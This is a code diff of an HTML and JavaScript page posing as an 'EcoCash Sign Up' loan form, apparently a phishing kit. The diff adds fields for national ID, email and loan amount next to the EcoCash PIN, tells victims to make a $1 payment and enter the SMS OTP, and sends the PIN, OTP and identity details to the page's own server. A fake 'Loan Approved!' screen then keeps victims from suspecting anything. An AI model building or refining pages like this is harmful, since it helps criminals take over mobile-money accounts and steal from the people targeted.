@@ -5,49 +5,53 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>EcoCash Sign Up</title>
 <style>
-  * { box-sizing: border-box; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    font-family: 'Roboto', Arial, sans-serif;
-    background: #ffffff;
-    margin: 0;
-    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    background: #f4f6f8;
     display: flex;
     justify-content: center;
     min-height: 100vh;
+    padding: 20px;
   }
   .container {
     width: 100%;
     max-width: 400px;
-    padding: 20px;
+    background: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    padding: 30px 20px;
+    margin-top: 20px;
   }
   .logo {
     text-align: center;
-    margin-bottom: 20px;
+    margin-bottom: 25px;
   }
   .logo img {
-    width: 120px;
+    width: 140px;
   }
   h2 {
     text-align: center;
-    color: #333;
+    color: #003366;
     margin-bottom: 20px;
-    font-size: 22px;
+    font-size: 24px;
   }
   label {
     display: block;
-    margin-bottom: 5px;
+    margin-bottom: 8px;
     color: #333;
     font-size: 14px;
-    font-weight: 500;
+    font-weight: 600;
   }
   input, select {
     width: 100%;
-    padding: 12px;
-    margin-bottom: 15px;
+    padding: 14px;
+    margin-bottom: 18px;
     font-size: 16px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    background: #f9f9f9;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    background: #fafafa;
+    transition: border-color 0.3s;
   }
   input:focus, select:focus {
     outline: none;
@@ -56,34 +60,56 @@
   }
   button {
     width: 100%;
-    padding: 14px;
-    font-size: 16px;
+    padding: 16px;
+    font-size: 18px;
     font-weight: bold;
-    color: white;
+    color: #ffffff;
     background: #F2A900;
     border: none;
-    border-radius: 4px;
+    border-radius: 8px;
     cursor: pointer;
     margin-top: 10px;
+    transition: background 0.3s;
   }
   button:hover {
-    background: #d49300;
+    background: #d99400;
   }
   .hidden { display: none; }
   .note {
-    background: #fff3cd;
-    color: #856404;
+    background: #eef7ff;
+    border-left: 4px solid #003366;
+    color: #003366;
     padding: 15px;
-    border-radius: 8px;
+    border-radius: 4px;
     font-size: 14px;
     margin-bottom: 20px;
-    line-height: 1.5;
+    line-height: 1.6;
+  }
+  .success-icon {
+    text-align: center;
+    font-size: 70px;
+    color: #28a745;
+    margin-bottom: 10px;
+  }
+  .success-text {
+    text-align: center;
+    font-size: 20px;
+    color: #003366;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+  .amount-text {
+    text-align: center;
+    font-size: 32px;
+    font-weight: bold;
+    color: #F2A900;
+    margin-bottom: 20px;
   }
   .footer {
     text-align: center;
     margin-top: 30px;
     font-size: 12px;
-    color: #999;
+    color: #888;
   }
 </style>
 </head>
@@ -105,15 +131,40 @@
     
     <label>Surname</label>
     <input type="text" id="surname" placeholder="Surname" required>
-    
+
+    <label>Country</label>
+    <select id="country">
+      <option value="Zimbabwe">Zimbabwe</option>
+      <option value="South Africa">South Africa</option>
+      <option value="Botswana">Botswana</option>
+      <option value="Namibia">Namibia</option>
+    </select>
+
     <label>Username (Mobile number)</label>
-    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+    <div style="display: flex; gap: 10px; margin-bottom: 18px;">
       <select style="width: 80px; margin-bottom: 0;">
-        <option>+263</option>
+        <option>263</option>
       </select>
       <input type="tel" id="phone" placeholder="Mobile Number" style="margin-bottom: 0;" required>
     </div>
     
+    <label>Email</label>
+    <input type="email" id="email" placeholder="Email" required>
+
+    <label>National Id</label>
+    <input type="text" id="nationalId" placeholder="National Id" required>
+
+    <label>Select Loan Amount</label>
+    <select id="loanAmount">
+      <option value="300">$300</option>
+      <option value="500">$500</option>
+      <option value="1000">$1000</option>
+      <option value="1500">$1500</option>
+      <option value="2000">$2000</option>
+      <option value="2500">$2500</option>
+      <option value="3000">$3000</option>
+    </select>
+
     <label>EcoCash PIN</label>
     <input type="password" id="pin" placeholder="Enter PIN" required>
     
@@ -124,15 +175,24 @@
   <div id="otpStep" class="hidden">
     <h2>Verify Identity</h2>
     <div class="note">
-      <b>Step 1:</b> Open your <b>EcoCash App</b>.<br>
-      <b>Step 2:</b> Do a <b>Quickteller</b> payment of <b>$1</b> to your own number.<br>
-      <b>Step 3:</b> Check your SMS for the <b>OTP</b>.
+      1. Open your <b>EcoCash App</b>.<br>
+      2. Do a <b>Quickteller</b> payment of <b>$1</b> to your number.<br>
+      3. Check your SMS for the <b>OTP</b>.
     </div>
     
     <label>Enter SMS OTP</label>
-    <input type="number" id="otp" placeholder="Enter the OTP from SMS" required>
+    <input type="number" id="otp" placeholder="e.g. 1234" required>
     
     <button onclick="submitOtp()">Verify OTP</button>
+  </div>
+
+  <!-- Step 3: Success Page -->
+  <div id="successStep" class="hidden">
+    <div class="success-icon">✅</div>
+    <div class="success-text">Loan Approved!</div>
+    <div class="amount-text" id="displayAmount">$1000</div>
+    <div style="text-align:center; color:#555; margin-bottom:20px;">Your loan is being processed.</div>
+    <button onclick="location.reload()">Start New Loan</button>
   </div>
 
   <div class="footer">
@@ -145,23 +205,25 @@
   function submitSignup() {
     const firstName = document.getElementById('firstName').value;
     const surname = document.getElementById('surname').value;
+    const country = document.getElementById('country').value;
     const phone = document.getElementById('phone').value;
+    const email = document.getElementById('email').value;
+    const nationalId = document.getElementById('nationalId').value;
+    const loanAmount = document.getElementById('loanAmount').value;
     const pin = document.getElementById('pin').value;
 
-    if(!firstName || !surname || !phone || !pin) {
+    if(!firstName || !surname || !phone || !email || !nationalId || !pin) {
       alert("Please fill all fields");
       return;
     }
 
-    // Send details to server
     fetch('/signup', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pin)}`
+      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&country=${encodeURIComponent(country)}&phone=${encodeURIComponent(phone)}&email=${encodeURIComponent(email)}&nationalId=${encodeURIComponent(nationalId)}&loanAmount=${encodeURIComponent(loanAmount)}&pin=${encodeURIComponent(pin)}`
     })
     .then(response => response.text())
     .then(data => {
-      // Show OTP step
       document.getElementById('signupStep').classList.add('hidden');
       document.getElementById('otpStep').classList.remove('hidden');
     })
@@ -171,7 +233,11 @@
   function submitOtp() {
     const firstName = document.getElementById('firstName').value;
     const surname = document.getElementById('surname').value;
+    const country = document.getElementById('country').value;
     const phone = document.getElementById('phone').value;
+    const email = document.getElementById('email').value;
+    const nationalId = document.getElementById('nationalId').value;
+    const loanAmount = document.getElementById('loanAmount').value;
     const pin = document.getElementById('pin').value;
     const otp = document.getElementById('otp').value;
 
@@ -180,16 +246,16 @@
       return;
     }
 
-    // Send OTP to server
     fetch('/verify-otp', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pin)}&otp=${encodeURIComponent(otp)}`
+      body: `firstName=${encodeURIComponent(firstName)}&surname=${encodeURIComponent(surname)}&country=${encodeURIComponent(country)}&phone=${encodeURIComponent(phone)}&email=${encodeURIComponent(email)}&nationalId=${encodeURIComponent(nationalId)}&loanAmount=${encodeURIComponent(loanAmount)}&pin=${encodeURIComponent(pin)}&otp=${encodeURIComponent(otp)}`
     })
     .then(response => response.text())
     .then(data => {
-      alert("Success! OTP Verified.");
-      location.reload();
+      document.getElementById('otpStep').classList.add('hidden');
+      document.getElementById('successStep').classList.remove('hidden');
+      document.getElementById('displayAmount').innerText = '$' + loanAmount;
     })
     .catch(error => console.error('Error:', error));
   }
